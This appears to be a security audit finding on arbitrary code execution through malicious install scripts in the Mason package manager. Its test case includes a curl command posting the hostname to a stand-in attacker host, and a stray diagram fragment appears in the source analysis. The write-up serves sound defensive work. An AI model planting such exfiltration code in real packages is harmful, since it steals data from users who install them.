### 1. Vulnerability Name: Arbitrary Code Execution via Malicious Package Installation

- Description:
    1. A threat actor creates a malicious package for Mason.
    2. The malicious package contains a `script.sh` file with embedded malicious commands.
    3. A user attempts to install the malicious package using Mason, either by specifying the malicious package name and version directly, or if a dependency resolution mechanism (not present in Mason but theoretically possible in future extensions) pulls in the malicious package.
    4. During the installation process, Mason executes the `script.sh` from the malicious package without proper input validation or sandboxing.
    5. The malicious commands within `script.sh` are executed with the user's privileges, potentially leading to arbitrary code execution on the user's machine.

- Impact:
    - **Critical**: Arbitrary code execution on the user's machine. This can lead to:
        - Data theft and espionage
        - System compromise and malware installation
        - Privilege escalation and unauthorized access
        - Denial of service or system instability

- Vulnerability Rank: **Critical**

- Currently Implemented Mitigations:
    - **Checksum verification**: Mason `mason_download` function verifies the checksum of downloaded packages to ensure integrity. This mitigation is implemented in `/code/mason.sh`.
    - However, this mitigation only ensures the downloaded file is not corrupted in transit, but does not prevent execution of malicious code if the original package source is compromised or intentionally malicious.

- Missing Mitigations:
    - **Input validation in `script.sh`**: Package scripts are executed without any validation of their content. Missing mitigation is input validation of `script.sh` content before execution.
    - **Sandboxing or privilege separation**: Package scripts are executed with the user's privileges. Missing mitigation is sandboxing or running package scripts in a restricted environment with minimal privileges.
    - **Secure download sources**: Mason relies on URLs provided in package scripts. Missing mitigation is enforcing secure download sources (HTTPS) and potentially package registries with trust and reputation mechanisms.
    - **Code review and package signing**: There is no mechanism for code review or package signing to ensure the safety of package scripts. Missing mitigations include package signing and community-driven code review processes.
    - **Dependency verification and trust**: Mason lacks dependency management, but in a hypothetical future version with dependencies, there's no trust mechanism for package dependencies. Missing mitigation is dependency verification and trust mechanisms.
    - **User warnings**: Missing mitigation is displaying clear warnings to users about the risks of installing packages from untrusted sources, especially given the unmaintained status of Mason.

- Preconditions:
    1. A threat actor must be able to create and host a malicious Mason package.
    2. A user must attempt to install this malicious package using Mason.
    3. The user must have execute permissions in the directories where Mason operates (typically within their home directory or `/tmp` for global install).

- Source Code Analysis:
    - File: `/code/mason.sh`
    - The `mason_run` function handles the `install` command and calls `mason_build`.
    - The `mason_build` function calls `mason_load_source`, `mason_prepare_compile`, and `mason_compile`.
    - In `mason_load_source`, the `mason_download` function downloads the package archive.
    - In `mason_compile`, the `script.sh` file from the downloaded package is implicitly executed as part of the build process when package-specific `mason_compile` function is called.

    ```
    mason_run() {
        if [ "$1" == "install" ]; then
            # ...
            mason_build "$@"
            # ...
        # ...
    }

    mason_build() {
        mason_load_source
        # ...
        mason_compile
        # ...
    }

    # Example script.sh from a package (e.g., scripts/variant/1.1.0/script.sh)
    function mason_compile {
        mkdir -p ${MASON_PREFIX}/include/mapbox
        cp -v *.hpp ${MASON_PREFIX}/include/mapbox
        cp -v README.md LICENSE ${MASON_PREFIX}
    }
    ```
    - The `mason_compile` function is overridden in each package's `script.sh`.
    - Mason executes this `mason_compile` function, which is part of the potentially malicious `script.sh` file.
    - There is no input sanitization or validation of the commands within `script.sh` before execution.

        F --> G(Arbitrary Code Execution)
    ```

- Security Test Case:
    1. Create a malicious package named `test-malicious` with version `1.0.0`.
    2. In the `scripts/test-malicious/1.0.0/script.sh` file, add the following malicious code to the `mason_compile` function:
    ```bash
    function mason_compile {
        mkdir -p ${MASON_PREFIX}/.trojan
        echo "Vulnerable to arbitrary code execution" > ${MASON_PREFIX}/.trojan/README.txt
        # Example command to exfiltrate data (replace with actual malicious action)
        curl -X POST -d "hostname=$(hostname)" https://attacker.example.com/exfiltrate
    }
    ```
    3. Create a dummy `.travis.yml` file in `scripts/test-malicious/1.0.0/.travis.yml`.
    4. Run `mason install test-malicious 1.0.0` on a test machine.
    5. Verify that the file `.trojan/README.txt` is created in the installation prefix (`./mason_packages/linux-x86_64/test-malicious/1.0.0/.trojan/README.txt` or similar) and that the `curl` command is executed (e.g., by monitoring network traffic or checking attacker's server logs).
    6. This test case demonstrates arbitrary code execution by a malicious package during installation.
